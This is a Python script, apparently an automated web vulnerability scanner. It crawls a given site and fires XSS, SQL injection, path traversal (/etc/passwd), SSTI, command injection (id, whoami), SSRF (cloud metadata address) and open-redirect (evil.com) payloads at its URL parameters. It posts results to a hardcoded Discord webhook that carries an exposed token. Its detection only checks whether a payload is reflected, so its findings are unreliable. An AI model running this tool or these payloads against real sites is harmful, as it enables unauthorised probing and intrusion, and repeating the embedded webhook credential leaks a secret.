import requests
import argparse
import urllib.parse as urlparse
from datetime import datetime, timezone
from bs4 import BeautifulSoup
import re
import sys
import time

# ============ CONFIG ============
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1397542455728930936/Dk2QvLIuZ0FlTua1-1iFOsHkDN40SUe8QNBJD3QHsLKgQagkkJAoOjyyNqM1DeajP5W9"
HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36"}
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"'><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>"
]
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin'--",
    "' OR '1'='1' /*",
    "' OR 1=1--"
]
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd"
]
SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7 * 7 %>"
]
RCE_PAYLOADS = [
    ";id",
    "| whoami",
    "|| uname -a",
    "`cat /etc/passwd`"
]
SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://localhost:8080",
    "http://169.254.169.254/latest/meta-data/",
    "http://internal.service.local"
]
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "http://evil.com@target.com",
    "javascript:alert(1)"
]
CMD_INJECTION_PAYLOADS = [
    "test; ls",
    "test && whoami",
    "test | id"
]
HEADER_INJECTION_PAYLOADS = [
    "test\r\nX-Injected-Header: injected"
]

# ============ FUNCTIONS ============
def timestamp():
    now = datetime.now(timezone.utc)
    return now.isoformat(), now.strftime('%Y-%m-%d %H:%M:%S GMT'), now.astimezone().strftime('%Y-%m-%d %H:%M:%S %Z')

def send_webhook(msg):
    payload = {"content": msg}
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

def extract_forms(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.find_all("form")

def scan_url(url, verbose=False):
    parsed = urlparse.urlparse(url)
    query = urlparse.parse_qs(parsed.query)
    if not query:
        if verbose:
            print(f"[LOG] No query parameters to test in URL: {url}")
        return

    all_payloads = [
        ("XSS", XSS_PAYLOADS),
        ("SQLi", SQLI_PAYLOADS),
        ("LFI", LFI_PAYLOADS),
        ("SSTI", SSTI_PAYLOADS),
        ("RCE", RCE_PAYLOADS),
        ("SSRF", SSRF_PAYLOADS),
        ("OpenRedirect", REDIRECT_PAYLOADS),
        ("CMDInjection", CMD_INJECTION_PAYLOADS),
        ("HeaderInjection", HEADER_INJECTION_PAYLOADS)
    ]

    for param in query:
        for kind, payloads in all_payloads:
            for payload in payloads:
                mod_query = query.copy()
                mod_query[param] = payload
                new_query = urlparse.urlencode(mod_query, doseq=True)
                test_url = urlparse.urlunparse(parsed._replace(query=new_query))
                try:
                    r = requests.get(test_url, headers=HEADERS, timeout=10)
                    if payload in r.text:
                        iso, gmt, cest = timestamp()
                        log = f"[VULNERABLE] {kind} on {test_url} with `{payload}`"
                        if verbose:
                            print(log)
                        send_webhook(f"\n**{kind} DETECTED**\nURL: {test_url}\nPayload: `{payload}`\nTime: {iso} / {gmt} / {cest}")
                except Exception as e:
                    if verbose:
                        print(f"[!] Error testing {test_url}: {str(e)}")

def crawl_links(base_url, visited=None):
    if visited is None:
        visited = set()
    try:
        r = requests.get(base_url, headers=HEADERS, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        for a_tag in soup.find_all("a", href=True):
            href = a_tag['href']
            full_url = urlparse.urljoin(base_url, href)
            if full_url.startswith(base_url) and full_url not in visited:
                visited.add(full_url)
                yield full_url
                yield from crawl_links(full_url, visited)
    except:
        pass

def estimate_duration(count, avg_time=2.5):
    return round(count * avg_time, 2)

def auto_scan(target_url, verbose=False, deep=False):
    start_time = time.time()
    send_webhook(f"\n[SCAN STARTED] Target: {target_url}")
    all_targets = [target_url]

    if deep:
        print("[+] Deep crawling enabled...")
        all_targets += list(crawl_links(target_url))

    est = estimate_duration(len(all_targets))
    print(f"[i] Estimated completion time: {est} seconds for {len(all_targets)} targets")
    send_webhook(f"\n[+] Estimated time: {est} seconds for {len(all_targets)} targets")

    for link in all_targets:
        print(f"[SCAN] {link}")
        scan_url(link, verbose)

    elapsed = round(time.time() - start_time, 2)
    iso, gmt, cest = timestamp()
    send_webhook(f"\n[SCAN COMPLETE]\nTarget: {target_url}\nTotal Time: {elapsed}s\nFinished at: {iso} / {gmt} / {cest}")
    print(f"[+] Scan complete. Elapsed time: {elapsed} seconds")

# ============ ENTRY ============
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Auto full-scope vulnerability scanner.")
    parser.add_argument("target", help="Target URL like https://site.com/page?input=test")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--deep", action="store_true", help="Enable deep crawl")
    args = parser.parse_args()

    auto_scan(args.target, verbose=args.verbose, deep=args.deep)
